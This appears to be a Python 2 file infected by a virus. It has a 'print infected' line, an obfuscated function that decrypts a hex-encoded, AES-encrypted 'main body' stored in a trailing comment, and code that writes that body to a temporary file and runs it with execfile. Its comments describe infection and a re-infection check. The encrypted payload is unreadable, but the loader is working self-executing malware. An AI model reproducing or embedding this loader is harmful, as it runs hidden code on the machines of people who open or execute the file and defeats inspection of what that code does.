print 'infected'



import os
import hashlib
from Crypto.Cipher import AES
import tempfile
def a5ad757b4c6493e132698d74fd805a76a():
	current_file_name = os.path.basename(__file__)
	#open this infected file
	with open(current_file_name,'r+w') as this:
		lines = this.readlines()
		# get key = hash(first line of this file)
		key = hashlib.md5(lines[0]).digest()
		iv = hashlib.md5(key).digest()

		cipher = AES.new(key, 1, iv)
		
		#get encrypted body from the last line		
		encrypted_body = lines[-1]
		#last line contains encrypted body and infection code
		#used for over infection check
		body = cipher.decrypt(encrypted_body[1:-34].decode('hex'))

		#create temporary file with the malware's main body
		tmp = tempfile.NamedTemporaryFile(mode='w',suffix='.py',delete=True)
		tmp.write(body)
		tmp.flush()
		#execute the main body
		#wiht a proper environment so that __file__ = tmp.name
		execfile(tmp.name, {"__file__" : tmp.name})
		tmp.close()
a5ad757b4c6493e132698d74fd805a76a()

#8b350c302f60b1f5e3f52ca613a97caa77e39e1041f60c7c5130b87846b89ce864d3baced4d83da9604fa6eb7694d0fb42f50a91faf3fa5b375e25babea38296e76992867a0391321beb86bc236759b6a597b6411ab1c01b68d8a28be92bfaa0b41d850136b5c18e4acd895cfcea8b833e42bf2fa4d0eb37fc78f6a2c3a752c491ec9c3667367febd6a5685f714c04834f74156637bb83ec019babad3c0820072286c9a7350d30f3e23e9b151e238121d7210e152a65abe6ba72c7dfc75f66f63427a33f5f54563ee5e6d193e848929e0dd3026909a06693a5627674a0553ea4ab239f878f7d121032d5b7464cda55ee93c9b2a2ec7bb3aac07ac8a6f2866ed825de25f4ad20acf151aa1f1bf8f715793e500a69cabd9e13ede950bfd8fe15ab021272d602ea72dba13fb193e07a0c9f727cef16042366eccc31e34e2a172c319d55a5f1a3aef3bcef3d39ed536df273d7043f1bfb2764fa3990c468e4a088cde7eab8055cd0e91695798678f3bd39b986c29582332aea9924864324543472ee33f5ae0b8fd10754be6385ef32d0492c6239b9478d4a51a6ebb9c1d61e720f6fb482433f3e74aca366ff5f8e204bf14457da03f4cb57e6da0c0eda8557766097ff4264c19ffa8e071973c6b8dc1eb29a65f1ad37af1220429cf88324fc9b532d08404904766f9dbe174c6e99ea14c9bba2e68efd42a45afe3da55dbaa760d6183f528b3d7981efc1d1a4afc644dffc610c1839cf9495e67dfc48003938c95d0be4e4a27392e0a5a51868704b7e155423520c059c1ce938c937e64bd421feb71ffb0df7b740ba0bfb012796bcc4a28e6484435273f915f884e8a427e6277dbe8071b58df238743dd6c7d1592ce9a9d48836275e6b3c19a970c142a8659c6609989e3c7635a6cd40ab8481e1933c4a99cf098ac2fe82bb10d55f2c4dacf6f16577b932c8ac525332232558ca96b329c346bfb1d99216a9cf62de351db55ed0f739d2fe2ce740ea0f5982ac39c32cbbf32f9db4d33b58d6d3ec225fb696aef334cf4e2109bc94c782972764450bdd924ce12c4889192d8e6067a5a3f2d457260eceac684dc6ff72d5ec33907a4d550e6476eb27b2d21bf26898de20029d909e3cd61ffbcd0ac8541d83353041e206e2eb7a6fa8013122b8701626db2b8b81995f20cccc93b9fa759ba9dd18fd8c4d1c5f28407a73fe92ffb09d3b4acaaaefb6be5c57dd4633e4edd9405f92fabd594e94234f03fc4af793ca6f14c4d3a92bc22bc09eb74756e3b2fd41b5f4cea00b58e88d3fda19949f26bf68cd0ff91fef130f7337cec09b94cad732f44ed9877313c3995b426461cf8f887441ba4321f23a644fdced93db61d106978dddd01541a455e953fd6b77fc41e6ee82bb78ebe5955ded523a67c29ae8dbedd61f7fcad1e4bde0b27ff128548580498162a217c21b3717f5bc0fcb214c15b3495c1e24369685c06829844fcff19413ed2e682d8276bb2cd7658d48b4f1f2b518a19b71f18732c0920b9a176a14185e1e32c88e06e81788fc3e702c2036b06691876cbadb1eda28b8e48356305b9dbf80b1137a66a63ac9a5dd759aa013de38a68501c1f4e8ee8e881bd91725e4725ec0b4ceb838beb15545ca74ef2f93bcd16f251f257d0af2274446872894cdaae95dfc72dbd959866153bd5a6503daf5158f55de9734e52c5b385b2acc5e9c8e591928b9618f70794b8bad80a962cd871e302c7b30686137b3e3e28b985d9addaa649ebc0ae0931f0e52d0ab42665ced2076c0accf7e00775ec9db08cfb8e414b6f6f8d7c2aa0aeb62c52210839c69ccd886b0e5af18c31ce9074a34816a2941cd847bf91437ae77cb1a93d3dfb98e7aed3988a25a49b139adb34bbcb8d5d0b4d3bf8ca8fdc207cc22b0fb3cb17a5324bdc2b56b7d3996e48bf2d5b4340f638a03d5b434ce4fe5a00cef85d8e3b8885f248bd12e6cdd06dced1cf9a2f50ac50ab9b3ccb2a74c562897cbef910c6a081eff1f125ff1e0f2ee1995537c7a7382c06108a1217bf6cf1d1709463c8f546e618dc113a8df728eaea9770d25df7981cad2fe83188defa1675e67d0e45c9837792beae2d8d8e05b10d5023b8da28f525206f3e0fc3a959e59f71b69192dcf3a3fd6c715b71abe07e5e08d5dd61e4ebd797e6d54d65295d694c4c774ee95a3f870497559c9f6e69d5b744f4a17a7b8ee14eb1329eaaeb091d770a6167e28ae64a2f9f1e5ed593aeae31b52a2e10adbffa7342732d1112d2eabd14c6057bcbc4621ee2326f7462999301f8b06e20211ec029b065f90ef0c7d28cb1f5cbd0073f2e3460eff45eb88c3eef5d9943f489e1b54820e1717e7b86490abf3de470c52ad10561a68c30416be8a7e69bf0af782964b0894e04d5b75ed1262ed032176ea637d63f5e37776ae07889fe52154807fe4dd39f25272189933ad92bf92dd69d7d82a211f264477e3d5a71209bdf4697d7146d0351a55d849ce7ecd7d8ab0b508bebc1dd1565e55fada1c55e896e92145f409120f8089d58886a1024a2e0e5d8bae1a71ec157e51b1c53ac1a247fcf066069390adab1b997c435222bd3bedbbeaa71c10413ebcb4cebe64b7136c0ff96ba25b58b542ef7ffdecd55d336d753bcd7273ec0f591dc7d1c2e758ae8184ae8af683cf45726aba6aa6385fa9b485a50fbc1cb4102c996b5df9a74790bdf53b562e4d58ce37072439a8c40f33f5ae0b8fd10754be6385ef32d0492c8734b59e6967bca77346d9c18078c79fd0d49307eb8d6039a4f8bec1c218dcad5ba63ed0057620559e27297401cdffda8d356af56c3ec2b423522fa03498817b0ef7be34774c6fb83b316923d642babdd685c2e7ea8872ae9c01f296128652ecb4206a2d3f36eed2dc6aa5105c2d09b1d347ead5799f896aa3dc1eec123f15191ed5225fdc65260c1209c890436e60e74c0af143a028f2c6d50e10c1f17b6a2ec5fd84eef409c0b1923cb8e3b42cbd82b87d36d8f73d0dfa4a0297b7e01694e92a5a9ee070e774a7c85ee03797727533d73a4e5798f21754f575ad0557cc6df8f23249ee6ab4d56e96758fe444681bdeba976c47e6136ca8aeecf45e5f0078eb4ca1378b756683c75a7bc1804534b2dbb513f53fb9a33a863a086148b6983c0fcdad16524867e40dc3f697c03488ef8951a845253be4bb6fe5ae509b1594fea4405e9ca7ee6755fdf27170481175d75b291c4b6d370652ac28dc96c04ec044703769e49c8411e7bf36cd6273782356bff5a3eef52a4ac81f9343244b0330c01b06b6b6b334d0079417a4a742cb53477b4752cd178c0740d99d80cc4f37b9491bf626035775deed4c67b9cf2c20793c692f0f71346ca10abf92e06935873ef4494c9ff208863cfa35cff276ba1137019292190ccf4ec817fc63376c2eb076281499f9b6c180988a0edb17c15e5ae0bbb379c3d23f0c6fe0a937aae23d0efc7dba6b0febb92e7793c6c8cddb430a3352c924ac3693c5dbb1dfdd1a4a85dcb821f0725b567f9f6464adec30b15c5adb1037b00084fb1fd1d306c86f7ff7f1318a5b57842f0e72d4b469d49bca12768f34916df636a4e91d40d550744236f0fafd4b68ce0b5649bdd260a1ecd15cbfd7eb2479c3d23f0c6fe0a937aae23d0efc7dba8b63a29c125c8d0e293c16df3e7475a36d4e87083daa8362ede4954e9a4cf3ac5f1d9e409bd038533f35d3229027ddd3463c41924f868d19ddb6d30512bd763ed018d05930b573e3a9e0b2a4a1ba126e26ce93356e69fcaede38e78342909582275bc49d9e5d2b2ec599b996221d572469e859877cfd40a8d80fd84cb5095b4216dd374e789b5a65a75c52ac3ba65f7fd5c7628e4ed3abf99734f4b36642a9067daa53e5f898726c5725164d3a40be4c79c3d23f0c6fe0a937aae23d0efc7dba79c3d23f0c6fe0a937aae23d0efc7dba#a486c47adef7a7743b7d1812875ed1f4
